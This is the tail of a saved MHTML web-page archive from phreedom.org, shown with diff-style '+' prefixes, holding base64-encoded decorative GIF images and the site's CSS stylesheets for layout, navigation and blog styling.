+Content-Location: http://www.phreedom.org/images/navbar-topright.gif
+
+R0lGODlhCAAIALMAAOfn5/r6+vPz8+3t7evr6/j4+PX19fLy8ubm5ujo6Pz8/PT09Ozs7O/v7///
+/+np6SH5BAAAAAAALAAAAAAIAAgAAAQdkLVjnHUvvxasfsSiYFrCiN8DDEWKPEL6JI38MBEAOw==
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/navbar-topleft.gif
+
+R0lGODlhCAAIALMAAOfn5/r6+vPz8+3t7evr6/j4+PX19fLy8ubm5ujo6Pz8/PT09Ozs7O/v7///
+/+np6SH5BAAAAAAALAAAAAAIAAgAAAQc0ElnTmMytMefUwvRPSCTjMUAjI/wIGxzsgzLRQA7
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/page-left.gif
+
+R0lGODlhFAABALMAAMfHx9TV16GhocvMztLT1fn5+dDR083O0NXW2P///wAAAAAAAAAAAAAAAAAA
+AAAAACH5BAAAAAAALAAAAAAUAAEAAAQKEMlAzBlAlMR7jwA7
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/page-bottom.gif
+
+R0lGODlhAQAUALMAAMfHx9TV16GhocvMztLT1fn5+dDR083O0NXW2P///wAAAAAAAAAAAAAAAAAA
+AAAAACH5BAAAAAAALAAAAAABABQAAAQKMMk5iwDjGBKQjwA7
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/page-right.gif
+
+R0lGODlhFAABALMAAMfHx9TV16GhocvMztLT1fn5+dDR083O0NXW2P///wAAAAAAAAAAAAAAAAAA
+AAAAACH5BAAAAAAALAAAAAAUAAEAAAQKMMk5iwDjGBKQjwA7
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/page-top.gif
+
+R0lGODlhAQAUALMAAMfHx9TV16GhocvMztLT1fn5+dDR083O0NXW2P///wAAAAAAAAAAAAAAAAAA
+AAAAACH5BAAAAAAALAAAAAABABQAAAQKEMlAzBlAlMR7jwA7
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/page-bottomleft.gif
+
+R0lGODlhFAAUANUAAMfHx9HS1M3O0MvMzs/Q0vn5+crKys7P0aGhocvLy8nJydDQ0MjIyPz8/K2t
+raCgoP39/cLCwtfY2tbW1vX19bCwsM3NzfPz85+fn7q6uri4uLe3t/7+/s/Pz8TExLOzs8HBwdLS
+0r6+vvv7+8PDw7u7u56ens7Ozufn56+vr+jo6MbGxtHR0czMzLGxsampqdDR09LT1dPU1tbX2dTV
+1////9XW2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAUABQAAAa4QJuQ
+FoMJBgBEocZsNoU2ohGpdFqh0iPgUYBYn8OiFnNpfJlYWYBwWFVAo3MtvT5YNhWVHBotEhgRLxEU
+Z3w0ajAJHSIfBoRXNjMzfQEWCQYZLh4oDRAcaJGShzETCwskJQ4OGRcFrkKSkzKzLSwGIQoaKSYY
+DwiwEpOHsxMnCQwGCgDLAHxQszIxATBsBwPXA85p0dMEBALgAtqGowHTMOjjocLDMe4x6sGSQzT1
+9eqxk+r7/P37QQA7
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/page-bottomright.gif
+
+R0lGODlhFAAUANUAAMfHx9HS1M3O0MvMzs/Q0vn5+crKys7P0aGhocvLy8nJydDQ0MjIyPz8/K2t
+raCgoP39/cLCwtfY2tbW1vX19bCwsM3NzfPz85+fn7q6uri4uLe3t/7+/s/Pz8TExLOzs8HBwdLS
+0r6+vvv7+8PDw7u7u56ens7Ozufn56+vr+jo6MbGxtHR0czMzLGxsampqdDR09LT1dPU1tbX2dTV
+1////9XW2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAUABQAAAa3wJpw
+OCwgAAMBLEazOYlQI1LJdNqgQ0jhMV02n9ha44LpVsHYEaiyOhACsu81rKpsLG64PEyJvCIMBF5W
+c0QUBh8iHQkweoRCHBANKB4uGQYJFgFVMzNOBaAXGQ4OJSQLCxMxcZ2eNggPGCYpGgohBiwtMrs2
+rU4AwAAKBgwJJxO7cb0SrgPOAwdujau8hE4C2AIEgpu7ctYw4Y3dNN/WNjHp1OW9nedO5fFfrRLv
+9u3u9/r7/NZBADs=
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/page-topright.gif
+
+R0lGODlhFAAUANUAAMfHx9HS1M3O0MvMzs/Q0vn5+crKys7P0aGhocvLy8nJydDQ0MjIyPz8/K2t
+raCgoP39/cLCwtfY2tbW1vX19bCwsM3NzfPz85+fn7q6uri4uLe3t/7+/s/Pz8TExLOzs8HBwdLS
+0r6+vvv7+8PDw7u7u56ens7Ozufn56+vr+jo6MbGxtHR0czMzLGxsampqdDR09LT1dPU1tbX2dTV
+1////9XW2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAUABQAAAa3QJtw
+SCwaj8jkcMacIWnQqLApQcauMZkMamsiYWBYIJDlJgVoAYEgzm6Rg/jgcGCTtbIjYA9QGBgJJxN4
+NF0STjYIDxgmKRoKIQYsLXhdTEIFmRcZDg4lJAsLE2VeNjU1HBANKB4uGQYJFmSFl6antxQGHyId
+CWJvQ7fCFBEvEQxsMYXBwrcqFRsWdQHAts01IyAVK9PV16cNFxgAAwIwyszXEAUP5OboQt+nBQju
+58vW1/T28DZBADs=
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/page-topleft.gif
+
+R0lGODlhFAAUANUAAMfHx9HS1M3O0MvMzs/Q0vn5+crKys7P0aGhocvLy8nJydDQ0MjIyPz8/K2t
+raCgoP39/cLCwtfY2tbW1vX19bCwsM3NzfPz85+fn7q6uri4uLe3t/7+/s/Pz8TExLOzs8HBwdLS
+0r6+vvv7+8PDw7u7u56ens7Ozufn56+vr+jo6MbGxtHR0czMzLGxsampqdDR09LT1dPU1tbX2dTV
+1////9XW2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAUABQAAAa3QJtw
+SCwaj8jkcMacKY2SppBGrSKlVJksxo0ps7FAAEaGIWnaMIxAELgFR+12TDgcBviBcBa1obUTJwkM
+BgoAhwB7TDZyLSwGIQoaKSYYDwiKM2gxEwsLJCUODhkXBaaKfmEWCQYZLh4oDRAcNTVEaGMJHSIf
+BhS1wLZDNDFrDBEvEb/BtcMyAXUWGxUqzMDO0AcrFSAj1s1TxQIDABgXDd/CqTDjAA8FEOnD4uQI
+BenqxOz19+lBADs=
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/external.gif
+
+R0lGODlhBgAHALMAAP///2aR/3Kj/GWZ/fT09Pr6+urq6tra2u/v79DQ0MXFxdXV1eXl5ba2tsvL
+ywAAACH5BAAAAAAALAAAAAAGAAcAAAQZEMhZhB2FHDECIlwQGGEzdspyIInDEEQRAQA7
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://www.phreedom.org/phreedom.css
+
+@charset "utf-8";
+
+html, body { margin: 0px; padding: 0px; }
+
+h1 { font-size: 2em; margin: 0.67em 0px; font-weight: bold; }
+
+h2 { font-size: 1.5em; margin: 0.83em 0px; font-weight: bold; }
+
+h3 { font-size: 1.17em; margin: 1em 0px; font-weight: bold; }
+
+h4 { font-size: 1em; margin: 1.33em 0px; font-weight: bold; }
+
+h5 { font-size: 0.83em; margin: 1.67em 0px; font-weight: bold; }
+
+h6 { font-size: 0.67em; margin: 2.33em 0px; font-weight: bold; }
+
+ul, ol { margin: 1em 0px 1em 2em; padding: 0px 0px 0px 1.5em; }
+
+li { margin: 0px; padding: 0px; }
+
+dl { margin: 1em 0px 1em 0em; padding: 0px; }
+
+dd { margin: 0px 0px 0px 3.5em; padding: 0px; }
+
+dt { margin: 0px; padding: 0px; }
+
+blockquote { margin: 1.25em 2.5em; }
+
+pre { margin: 1em 0px; }
+
+form { margin: 1em 0px; }
+
+img { border: 0px; }
+
+table { margin: 1em 0px; border-collapse: collapse; border-spacing: 0px; }
+
+th, td { margin: 0px; padding: 0px; }
+
+td, th { font-family: inherit; }
+
+body { font: 81.25% "Lucida Grande", "Lucida Sans Unicode", Verdana, Arial,=
+ Helvetica, sans-serif; color: rgb(68, 68, 68); background: rgb(213, 214, 2=
+16); }
+
+input, select, textarea { font: 1em "Lucida Grande", "Lucida Sans Unicode",=
+ Verdana, Arial, Helvetica, sans-serif; }
+
+pre, code, kbd, tt, samp { font: 0.92em "Courier New", Courier, "Lucida Con=
+sole", Monaco; }
+
+a, a:hover, a:visited, a:active { text-decoration: none; color: rgb(0, 0, 2=
+48); }
+
+a.external { padding-right: 7px; background: url("images/external.gif") rig=
+ht top no-repeat; }
+
+pre.code { margin: 1.25em 0px 1.25em 2.5em; }
+
+#page { margin: 0px auto; max-width: 67em; min-width: 62em; color: inherit;=
+ background: white; }
+
+div.page-topleft { background: url("images/page-topleft.gif") 0px 0px no-re=
+peat; }
+
+div.page-topright { background: url("images/page-topright.gif") 100% 0px no=
+-repeat; }
+
+div.page-bottomright { background: url("images/page-bottomright.gif") 100% =
+100% no-repeat; }
+
+div.page-bottomleft { background: url("images/page-bottomleft.gif") 0px 100=
+% no-repeat; }
+
+div.page-top { background: url("images/page-top.gif") 0px 0px repeat-x; }
+
+div.page-right { background: url("images/page-right.gif") 100% 0px repeat-y=
+; }
+
+div.page-bottom { background: url("images/page-bottom.gif") 0px 100% repeat=
+-x; }
+
+div.page-left { background: url("images/page-left.gif") 0px 0px repeat-y; }
+
+div.page-content { padding: 20px 20px 3em; }
+
+#header { margin-left: 0.2em; }
+
+#header h1 { margin-bottom: 0px; }
+
+#header p.subtitle { margin: 0.8em 0px 1.3em; font-size: 1.1em; }
+
+#navbar h2 { display: none; }
+
+#navbar { color: inherit; background: rgb(233, 233, 233); }
+
+div.navbar-topleft { background: url("images/navbar-topleft.gif") 0px 0px n=
+o-repeat; }
+
+div.navbar-topright { background: url("images/navbar-topright.gif") 100% 0p=
+x no-repeat; }
+
+div.navbar-bottomright { background: url("images/navbar-bottomright.gif") 1=
+00% 100% no-repeat; }
+
+div.navbar-bottomleft { background: url("images/navbar-bottomleft.gif") 0px=
+ 100% no-repeat; }
+
+div.navbar-content { padding: 0px 10px; height: 1.77em; }
+
+#navbar ul.menu { float: left; margin: 0px; padding: 0px; list-style: none;=
+ border-left: 1px solid white; }
+
+#navbar ul.menu li { float: left; border-right: 1px solid white; }
+
+#navbar ul.menu li a { float: left; padding: 0px 1.2em; line-height: 1.77em=
+; }
+
+#navbar ul.menu li a, #navbar ul.menu li a:link, #navbar ul.menu li a:visit=
+ed, #navbar ul.menu li a:active { color: white; background: rgb(137, 164, 1=
+77); }
+
+#navbar ul.menu li a:hover { color: white; background: rgb(69, 98, 115); }
+
+#navbar ul.menu li.current a, #navbar ul.menu li.current a:link, #navbar ul=
+.menu li.current a:visited, #navbar ul.menu li.current a:active, #navbar ul=
+.menu li.current a:hover { color: white; background: rgb(205, 126, 63); }
+
+#navbar form.search { margin: 0px; padding: 0px; text-align: right; }
+
+#navbar form.search input#search-text { width: 14em; vertical-align: top; m=
+argin: 2px 2px 0px; padding: 1px 2px; border-width: 1px; border-style: soli=
+d; border-color: rgb(171, 173, 179) rgb(219, 223, 230) rgb(227, 233, 239) r=
+gb(171, 173, 179); font-size: 0.92em; color: black; }
+
+#navbar form.search input#search-image { height: 1.77em; width: 1.77em; ver=
+tical-align: top; color: rgb(68, 68, 68); background: rgb(233, 233, 233); b=
+order-right: 1px solid white; border-left: 1px solid white; }
+
+#navbar form.search input#search-image:hover { background: rgb(192, 192, 19=
+2); }
+
+#sidebar { float: right; width: 14em; margin-top: 1.3em; clear: both; }
+
+#sidebar h2 { display: none; }
+
+#sidebar h3 { font-size: 1em; }
+
+#sidebar ul { list-style: none; padding: 0px 0px 0px 0.8em; margin: 0px; }
+
+#sidebar ul.comingup p.location { margin: 0.1em 0px 1em; font-size: 0.92em;=
+ }
+
+#sidebar ul.latest li { margin-bottom: 0.5em; }
+
+#content { margin-right: 17em; margin-left: 0.2em; margin-top: 1.77em; }
+
+#content p { text-align: justify; }
+
+#footer { clear: both; margin-top: 2em; }
+
+#content div.slides { width: 40em; height: 30em; border-width: 1px; border-=
+style: solid; border-color: rgb(171, 173, 179) rgb(219, 223, 230) rgb(227, =
+233, 239) rgb(171, 173, 179); }
+
+#content div.slides object { width: 40em; height: 30em; margin: 0px; paddin=
+g: 0px; border: 0px; outline: 0px; display: block; }
+
+#content div.slides div.alternate { width: 38em; height: 28em; padding: 1em=
+; }
+
+#content div.slides div.alternate p { text-align: center; margin: 0px; line=
+-height: 28em; color: rgb(136, 136, 136); }
+
+#content div.video { width: 400px; height: 326px; border-width: 1px; border=
+-style: solid; border-color: rgb(171, 173, 179) rgb(219, 223, 230) rgb(227,=
+ 233, 239) rgb(171, 173, 179); }
+
+#content div.video object { width: 400px; height: 326px; margin: 0px; paddi=
+ng: 0px; border: 0px; outline: 0px; display: block; }
+
+#content div.video div.alternate { width: 400px; height: 300px; padding: 1e=
+m; }
+
+#content div.video div.alternate p { text-align: center; margin: 0px; line-=
+height: 30em; color: rgb(136, 136, 136); }
+
+#content div.blog-entry { margin-bottom: 2em; }
+
+#content div.blog-border-top { border-top: 1px dashed rgb(136, 136, 136); }
+
+#content div.blog-entry h3 { margin-bottom: 0px; }
+
+#content div.blog-entry h3 a { color: rgb(68, 68, 68); text-decoration: non=
+e; }
+
+#content div.blog-entry p.date { font-size: 0.92em; margin-top: 0.75em; mar=
+gin-bottom: 1.4em; }
+
+#content div.blog-index table td { vertical-align: middle; font-size: 1.08e=
+m; padding-top: 0.2em; }
+
+#content div.blog-index table td.date { white-space: nowrap; text-align: ri=
+ght; padding-right: 0.75em; color: rgb(160, 160, 160); font-size: 0.846em; =
+}
+
+#content div.blog-index table td.name { padding-right: 0.75em; }
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-18fbbcbf-765f-4a5c-905c-f950cd28c554@mhtml.blink
+
+@charset "utf-8";
+
+@import url("../../phreedom.css");
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-7b5893d9-e12c-47c9-9df9-9eff51c424d7@mhtml.blink
+
+@charset "utf-8";
+
+body, td, th { font-family: Arial, Helvetica, sans-serif; }
+
+pre, code, kbd, tt, samp { font-family: "Courier New", Courier, "Lucida Con=
+sole", Monaco, monospace; }
+
+img { border: 0px; }
+
+#sidebar ul.comingup p.location { margin: 3px 0px 1em; font-size: 0.85em; }
+
+#navbar form.search input#search-text { vertical-align: top; }
+
+#navbar form.search input#search-image { vertical-align: top; }
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S------
